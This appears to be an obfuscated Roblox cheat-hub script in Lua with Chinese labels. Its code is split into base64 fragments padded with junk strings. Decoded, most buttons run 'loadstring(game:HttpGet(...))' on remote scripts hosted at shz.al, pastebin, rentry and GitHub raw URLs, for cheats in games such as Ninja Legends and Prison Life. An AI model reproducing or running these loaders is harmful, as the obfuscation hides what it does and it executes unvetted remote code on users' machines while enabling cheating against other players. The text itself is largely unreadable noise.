3c6VGFiKA==')极速传奇tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sIFQSKYTBFcxeSSGzLIBhDRVLddwFURoYPOPWTDuqVzWBJbsemRJMtBrFspfeKvUQvAcdLLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yGmDdYcVtzJDLzMwdODCRxkNAylUYwdNYEgWgBTdeYjOiymEJGJafPlFqRQSSPDjtwsAjEKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')自制为云uitZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TNYvbsITVdzGPsHDdykqUaQEyYzvVJYzYzlDSfeFZNOryfcEijMXkSFnYqpoIFFuNnfvRQLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺自制极速传奇tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZuDlppWKHsafHAWdyJLriuwtsJtkiEFeVgwQSuCbUrAbPVvYqqHFXcDDlhpKXxONEdjZrjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~lninjjtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QNGNMOhVwRAwkWspEtLNjrLeGNLKxhAGSlZDJsvcMGmxRXyflbnmQGqqMRsAiiGtkeynNOKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GpwVefpkLclnVSOeOetILBNBdWJiInZAawNElXzAslcbABXMXlPYoibOaoeQFviEOYMhYKLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pvvwVHkDjcOMIUIPOwZZokYZPqkzlDArTeizDRzwAHunFPHHoNQSqNsMGBebdzqXTMfrmDamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BamlTlNTuFbAfAwQUKxKgGeDQDrrTTgsmtssrrnnBeqfiYlzhMltHLUrVRLciTogUFZXmNamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aixyhAhHlKFvSlXHbnYdBQJnrokTiozjquipSnldmFgHUXOpgRcxkAhUppffHBufpijksNbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FPgXxlrWnpRRkBgXLFHpXQrKntnNZFTAjTmUfETCTUrpgbIajuDaauSOOkHwRsHeKMSAiBKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')忍者传奇tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eEJTIHEfvNyZNuSKCCzLuZDCDYtpylefRfbRHvpTJDrzCqwdzdneQyYEevOHoKsBijFqHJLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QmWKpomtjaPqViThwWZecpPBytyBOFhcoJnssmuVITIWTSSOzSdiUkkZDbHPxaykwaAOJrKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AfNokEyHxjcCckFqLFVJZwcveSBKJxfnDEGmAGSKmhlrKiJnDppXUCmVazqPWwyGJLaQpfLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺忍者传奇（来源白貓）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vAtXbkpSrFceRNGPwGzsTNFOhWXtjymyiisQaoImnWJphyJBwzXdPDQqAjxYuyxZNzEhGZLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~baimaomeilihhtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KiRAGjDeTkchIKDnFlQXRZTKMKywJmwtvdbGBSfZyuUHdaYzxTKfqWRlYeYbkyShDOFGoQKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')忍者传奇tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MmnnxbpaHmPwFPwijeqTlPAVAQbWyTnFulGrqOUppgKGeoBEvGMZxRZULSNyyNIioYVUwTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Zyb150933/zyb/main/123tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jDvBkAJKszMehMYrrEOUCYzQaDwCdvpGwIILUrgNnNdNlshRzyMPFmeFSEiDSMRzGaamfSKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sccbjJgDquQEWQWVoZwhwMTVcFRHRtpcPcdURgcsAruaPSpaOJtNcEXZhtgaXqeTHkcHSmLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sIFgIcYvqdqmTqriuTyiwsJBDoAEBMsjRzgfMmfNWVTcEFvWiiwxZbqSaYaXkcsgYzeuVBamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LyqovmrlKSauidwfpRuAXTwISFVCoMjwTxSrTKNEPkGuJWLLfAMHeCFgCQJLneoZjDzogyamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xCBPNgDazPQAEXubyygvXNxBcZKeqkhRpBzXTmLtNcBJetInwXFwyiUfaMlxNoNhrHjtOVbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pVdMNFiqWVTsbLvMYkmwPtDBFmZPEWknpuZpEQxmquZbracSpnkIoCCBBpSYoxNlvJMnrXKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')忍者（老外1）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pZbPhBSYOBSoxiTYzBchOFkywCWTFQWTdXLFNcfvNyVPZHGhmSGgStlOKgvvEVzwOiGQHfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/zerpqe/script/main/NinjaLegends.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sZJDyldgorumbqADxMLkNUjeeXCsyZZjsGOXsBUIuxDLXedKeexsfArIGBMtiEmqpXGfXZKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')忍者（老外2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ubSsJiJgFPwsXZqYvGuHgRpYIMfnCMvZVIJlqwgOoqtkAiHqXQobEFbjRtcAywQsvqplwjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ThatBlueDevil/Bleus/main/Ninja%20Legends/Source.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hYbMFAgVqwxtqPCrkmoqSxmfzAAMHIXdvinhuPuuBOrIBkqQIpTOAMFhFomfyDkdDfufQtKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')监狱人生tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AniHrJVAbZcTvCOWqgveinvcBmLNKuScpovEBBgupBTZzlHVeSrIDGlfWxNNUeypfKFIphLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LVCmdkrOJDtBcJmKOWuwTXtpfDENQGuScbcqqaghPMnxPswgShecyPhstIkVKFjkbxqPGqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XfoJiGpXApGXEruBBVEquavbSjyasEbaSBsbgoPaWOMcgtpdkUCgLCxWFnbecOEVRJeMPjLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')油管找的管理员脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QpeEBxaCGeMYJSEOphuTGxWDAJKsGTlgtrrtHULspBbwcPQLThBYCCknSYrADbdgulbfkRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~ggghhhhtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jthCWdEPYkGAomrJNVCTwSijBkJxtNKGRiZcOSmuuNdHOATIuGodJXCDwtgALLeUWCHVexKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')汉化后的moonhubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wyRugEFxcPmqKgGITwxLgFHrNWTVEmUXmAAaTPuFeYpszOcFKIcdvrxoyughjarvtMHkzELGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~MoonHubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iBWKoUAXaRxgIHrhcyUjGxxPjVpbVNhFymUHzBUWycXOrQOEZZmwmfHPhBAyUuBHgdfAgPKSkoKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')Tiger无敌了tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NqeeGLJKhXyeLgPXnAHoeuTZqrnXCtSvpMmfzLFAmsoYEwDYPGwzWGbjyjAoRBLGsdAPftLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')tigertZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vTyGHkQBXGVLxgzAkjICvXaBSkpyhXApZysTYUoJyhqEjKIfHEJjZqQznbxLGVMrzuSmyyLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/dalloc2/Roblox/main/TigerAdmin.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tOYPhRhOtjxWwgfCsTslDIlQwWpYdzYAMzvlisLhIeIuMkrfjnCbrnAYzEhaSytakFvWGsKSkoKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')霖溺嘿tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PZssqlGaofgeiQRydZeSfIanvUBnoQiCZMSTzFHBXxHTmHKjupjDXvyUBlvQFaITlNImvjLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')听说吊打一切tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hKpLIvyvCwaPUVvurcxZaFeTqsqSgLmKLaugfjjyWyrqxIehlifVKQkdtknBbdtDgkWuoBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xunrVlwchZEAXjEKmOiySwqrXroxSlGmTSKbvZiyzAeabZUOoOSnwlAsPOldGQMaOxxPmpKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')请使用青脚本里的管理员脚本（推荐）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eJZaFgpehXkYgPxzlGwgIpVQYIQqbJZDyfdANXwEFvuIqBYOlYyCfwmKofwDVEvnuDbvgGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://rentry.co/ct293/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FituZKKdxWvwiXFTrrKVuuPXnaOJmlNvUFGMlqoFlNRMJhEfmircfkwhkFuOIDnacJEjgjKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本（通用）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EXSVqwURhjguInhrEZPeswqVsrCvCuncWrtWklnUUULHtVYLZGGruoyHylPzWUMtffRkyJLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hasQqiklHHferxLWpdvnZlZdcQAvxQFxwlJpburqsrHDyXuUYUsfymxEKLdwTSCQhRiFsjamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UIJopzOAxiSWYIHYJYTEQYfhfrFmUFOrQzokAOlWHzLxMMYQejAJUrosHNrpFGZNCGnCqSamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pIBCBndbJNNVvzqmXCxVQFqLetTGXtTXfFBCdVtOjPQALkSeKumbLqOWykEcpgsbEYdrQhbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tVFthnxcLbJjmtukssfeTGESWnDMFCkCEQHRwHsmhVeBmrLEUfCkXpOsMrLfmmJPwDKRNUKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')死亡球tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BLITaDlNYfSVifoHZyxYDzVxNVUbYQHcrmBDmmpezPiKKWocREwMFhqqbeUIYqCGfcqJQpLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KYArTwtmLVWVKOTmVvBHFJuumhuHWBiMWJHsTJvSmmrPnSboWDMDALuKeywXEToKXMtBfTKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lEPTwONKQgjgMDDjfXqcwOOmVqAHQqdjjIvHjVEmGkzlTyLwLCecLIyZEOkMJkXHwjYkLFLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')死亡球（1）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YAogXCptBbYpFZHwoAmYXGxeufaNxjVIMKiYEQKAehgYzADlDlKjhOypxSdlAfEttNSbLRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://github.com/Hosvile/InfiniX/releases/latest/download/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TOvpiibjWmQwaGviPRYvaKFglajwANVbLZdPLloRvpeGerEanhucWZaJEQsgqdXgDFICuoLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')死亡球（2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JzoeMKTYFXOprHtUhMRRYNmdcJsqUGWIvpVAeQpgVYnwoSMZDDFyTPbICmrxUqDlcPnOZTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/LOLking123456/Ball1/main/DeathtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mZvYqExILrFWFgkcXLqNCSSfwdTjjqeyePueurgGgjhtFnDGYMEzaehMGDIwqjgARZKLGTKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')自然灾害tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PsSZSLsgYFStEOXHoyNSMtrDUACBErvDBqxMnchPPVytADVjypLwbImCUKXoxNnEgJJnEiLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qUZBnhGuLIxFYGWFnbibVvBWfAWAOLwplRHUeuYcSuxCWffutqdrLINLnuKSmDblCNoABMKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')自制为云uitZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yOhljYcidVTbFEqYuceunoVxhYFxLSJtkPvssRQfyzjCsqkdmktjARoOLQAWgqwUYhbvAILHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺自制自然灾害tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ClRJSKBuBbGYgUBPTLPiLwLTYAPMwdOMplbrThopUROhpEDcBiwHCwFFxWeAWEoxZbzrDALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/D8KntZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IfDsbXxACabVmQyUbacfNIwPMXlndHrjiziLMQyXntXjViOvXpwQDPonhbvUgTNSCFeijfKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')自然灾害luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oQAeUWIrYkyAcmdnWVGdIHZQbiiBLzYqKvASzNdLExWTgStqLlMRNWaLOxylZfxZoqPyeSLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/5fKvum70tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pcWUMGkljwLaHKBQCtKViDquoJpCFiNTNHUJEupXICvrHMxddMISRzPmTkYBzgiHeOROEqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')自然灾害1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aRtXSwKTSMszjVNOluhoAjuPNSFJLQUGTFjNveguRgJydapRGbUNJLqdRbyQGvHVOruLpeLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://gist.githubusercontent.com/TurkOyuncu99/7c75386107937fa006304efd24543ad4/raw/8d759dfcd95d39949c692735cfdf62baec0bf835/cafwetwegtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ehNyFStQhkfwEELVdGHDVriIOrqRSRJhNXSiGJyMcgkJMcNLvCalItNHKwRHTjFhfWwLYULCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')自然灾害2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uWAylircGSzzvwKuNTqaWBARJbymxLslvlFSAStmGWYbBIUDTOMPOkWdwUyMeyAXpSbPcsLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HgacqceXTBOJTRWbFoDDirimOnUoZWDHUlNaAwkLKlsehiBsqUVTnGgQqlqNhVQZTxkHXxLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')自然灾害3tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JvNZhsxjUKBVCDBkLWlWOmRNFAeYkkGXTEgbgeewUWOSWLdLyBYqKneoytXOMWIXUHwGhzLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/maintZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oiWmMakwxUKAmjWYWaLCzfhejMuXKcMknmvHBVacJhjjGFdwpeYaptbJArwadWKsRSbORzKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OJNeWQarpXDOgElIaZdVSAdGxKCEjdJlGrHudPEHwEmDIpJmrPjbSIJwSsDHlSOLZltYXZLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mkqyBTXjfKuDkMYlXnWszLkWJFiqRLrUxAxwjYyuYlaaSMORsqowRPUXXiHcJnCyJymNzoamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UEtoSKlKEUxjaHQylBcIfFnbjudCKxYajuBWjwhJYYIfjXNkMgMDhLGiDSvZBZFRtJCcjzamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lXssHEylVTWRobFZgsGPhaftCIeWOLAuHDnNwKGDMjVndQlevChgiiOCCFqxfvyLXHnoYcbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ADWUOOmWpaUhtlluusxjGnmrtnHTrTWmYeiVmqiaPZXrhefDvlNDefLQDbFkGBMTUHJYjEKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')杀手于警长tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WttAoWhIZZaYocXSQqTGTZyUWBGAWmDdGcDjkTgjXDjpJYbAoSAcdifZVjjvWATLiUPfEgLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DcJpQCQgWFzPDVLFNhBGLgnFcnuCzVYtwcWzdCUtrVDNtVlaCVMPWIwKRUPouTdnhtUgLbKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TiTdCEddgbXHNSuTaUnhQauzQdrlqLfWNUHCJDIeNtwlmlFVNcwelNAeqRZTnxsmkyeULHLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')杀手于警长（找的）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('duLbbmnEAfDfKOFojeBKhfwShGaRGaxZVsFIhyApAlInUqeCVtoqXUvoPfcYckqvLAGCymLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/yadbPQUmtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuC